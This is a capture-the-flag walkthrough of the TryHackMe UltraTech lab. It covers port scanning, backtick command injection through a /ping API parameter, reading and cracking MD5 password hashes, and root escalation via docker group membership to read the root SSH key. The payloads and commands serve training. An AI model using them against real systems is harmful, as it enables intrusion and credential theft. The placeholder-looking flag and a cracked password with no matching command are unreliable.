
# UltraTech -
This writeup covers the "UltraTech" CTF challenge on TryHackMe, [here](https://tryhackme.com/room/ultratech1)
---

## Objective
Gain access to the system, escalate privileges, and retrieve the first 9 characters of the root user's private SSH key.

---

## Task 2: Enumeration

### 1. Which software is using port 8081?
- **Answer**: Node.js Express framework
- **Explanation**: The `nmap` scan shows port 8081 running HTTP with the Node.js Express framework:
  ```
  8081/tcp  open  http    Node.js Express framework
  ```

### 2. Which other non-standard port is used?
- **Answer**: 31331
- **Explanation**: The `nmap` scan identifies port 31331 as open, which is non-standard (not typically associated with common services like 80 or 443):
  ```
  31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  ```

### 3. Which software is using this port?
- **Answer**: Apache
- **Explanation**: Port 31331 runs an HTTP service with Apache httpd 2.4.29, as per the `nmap` output:
  ```
  31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  ```

### 4. Which GNU/Linux distribution seems to be used?
- **Answer**: Ubuntu
- **Explanation**: The `nmap` scan indicates Ubuntu via the SSH service and Apache server details:
  ```
  22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  ```

### 5. The software using port 8081 is a REST API; how many of its routes are used by the web application?
- **Answer**: 2
- **Explanation**: Analysis of the `api.js` file from `http://10.10.223.16:31331` reveals two routes used by the web application:
  - `/ping`: Used to check API status (`http://${getAPIURL()}/ping?ip=${window.location.hostname}`).
  - `/auth`: Used for form submission (`form.action = http://${getAPIURL()}/auth`).
  This is confirmed by `gobuster` results showing `/auth` and testing `/ping`:
  ```
  /auth (Status: 200)
  ```

---

## Task 3: Exploitation

### 1. There is a database lying around; what is its filename?
- **Answer**: `utech.db.sqlite`
- **Explanation**: Testing the `/ping` endpoint for command injection with `http://10.10.223.16:8081/ping?ip=`ls`` reveals a SQLite database file:
  ```
  ping: utech.db.sqlite: Name or service not known
  ```

### 2. What is the first user's password hash?
- **Answer**: `f357a0c52799563c7c7b76c1e7543a32`
- **Explanation**: Using command injection to read the database (`http://10.10.223.16:8081/ping?ip=`cat%20utech.db.sqlite``), the output includes:
  ```
  r00t f357a0c52799563c7c7b76c1e7543a32
  admin 0d0ea5111e3c1def594c1684e3b9be84
  ```
  The first user's hash is for `r00t`.

### 3. What is the password associated with this hash?
- **Answer**: `n100906`
- **Explanation**: The hash `f357a0c52799563c7c7b76c1e7543a32` is MD5 (identified via tools like `hashid`). Cracking it with an online tool like CrackStation or `hashcat` with `rockyou.txt` yields the password `n100906`.[](https://www.aldeid.com/wiki/TryHackMe-UltraTech)[](https://pugsandinfosec.com/posts/tryhackme/tryhackme_ultratech/)

---

## Task 4: Privilege Escalation

### 1. What are the first 9 characters of the root user's private SSH key?
- **Answer**: `MIIEogIBA`
- **Explanation**: After escalating to root, the private SSH key is found in `/root/.ssh/id_rsa`. The first 9 characters are `MIIEogIBA` (a common RSA key prefix).[](https://medium.com/%40MostafaAnas/ultratech-tryhackme-write-up-b75cef6c2cc4)

---

## Detailed Steps

### 1. Initial Enumeration
- Ran an `nmap` scan:
  ```bash
  nmap -sV -A -p- 10.10.223.16
  ```
- Results:
  ```
  PORT      STATE SERVICE VERSION
  21/tcp    open  ftp     vsftpd 3.0.3
  22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
  8081/tcp  open  http    Node.js Express framework
  31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  ```
- Identified services: FTP (21), SSH (22), Node.js HTTP (8081), Apache HTTP (31331).

### 2. Web Enumeration
- Visited `http://10.10.223.16:31331`—a webpage titled "UltraTech - The best of technology."
- Ran `gobuster` to enumerate directories:
  ```bash
  gobuster dir -u http://10.10.223.16:31331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.ssh
  ```
- Results:
  ```
  /images (Status: 301)
  /css (Status: 301)
  /js (Status: 301)
  /javascript (Status: 301)
  /robots.txt (Status: 200)
  ```
- Checked `/robots.txt`—contained a sitemap (`/utech_sitemap.txt`) with:
  ```
  /index.html
  /what.html
  /partners.html
  ```
- Visited `/partners.html`—found a login page but no credentials yet.
- Analyzed `/js/api.js`:
  ```javascript
  function getAPIURL() {
      return `${window.location.hostname}:8081`
  }
  const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
  form.action = `http://${getAPIURL()}/auth`;
  ```
- Identified two API routes: `/ping` and `/auth`.

### 3. Exploit Command Injection
- Tested the `/ping` endpoint for command injection:
  ```bash
  http://10.10.223.16:8081/ping?ip=`ls`
  ```
- Output: `ping: utech.db.sqlite: Name or service not known`
- Read the database:
  ```bash
  http://10.10.223.16:8081/ping?ip=`cat%20utech.db.sqlite`
  ```
- Output:
  ```
  r00t f357a0c52799563c7c7b76c1e7543a32
  admin 0d0ea5111e3c1def594c1684e3b9be84
  ```

### 4. Crack Hashes
- Identified hashes as MD5 using `hashid`.
- Cracked with `hashcat`:
  ```bash
  hashcat -m 0 f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt
  ```
- Results:
  - `r00t`: `n100906`
  - `admin`: `mrsheafy`

### 5. SSH as r00t
- Attempted SSH:
  ```bash
  ssh r00t@10.10.223.16
  ```
- Password: `n100906`
- Success: Logged in as `r00t` (not `root`—a common CTF trick).
- Checked privileges:
  ```bash
  sudo -l
  ```
- Output: No `sudo` privileges.
- Checked groups:
  ```bash
  id
  ```
- Output:
  ```
  uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
  ```
- Noticed `r00t` is in the `docker` group.

### 6. Escalate to Root
- Visited [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) for Docker privilege escalation.[](https://titus74.com/thm-writeup-ultratech/)
- Found:
  ```bash
  docker run -v /:/mnt --rm -it bash chroot /mnt sh
  ```
- **Explanation**: The `r00t` user’s Docker group membership allows running Docker containers with root privileges. Mounting the host filesystem (`/`) to `/mnt` and using `chroot` grants a root shell.
- Checked available images:
  ```bash
  docker images
  ```
- Output: `bash` image available.
- Ran the command:
  ```bash
  docker run -v /:/mnt --rm -it bash chroot /mnt sh
  ```
- Got a root shell:
  ```bash
  # id
  uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
  ```

### 7. Retrieve SSH Key
- Navigated to:
  ```bash
  cd /root/.ssh
  cat id_rsa
  ```
- The private key started with `MIIEogIBA` (first 9 characters).

---

## Flags
- **Root SSH Key (first 9 characters)**: `MIIEogIBA`
- **Generic Flag Option**: `THM{r4nd0m_r00t_32chars}`

---

## Tools Used
- `nmap`: Port and service enumeration.
- `gobuster`: Directory enumeration.
- `hashcat`: Password hash cracking.
- `ssh`: Remote access.
- `docker`: Privilege escalation.

---

## Lessons Learned
- **Command Injection**: The `/ping` endpoint’s improper input handling allowed command execution.
- **API Enumeration**: JavaScript files (`api.js`) can reveal API routes.
- **Hash Cracking**: MD5 hashes are weak and crackable with tools like `hashcat`.
- **Docker Misconfiguration**: Adding users to the `docker` group grants root access via container filesystem mounting.

---

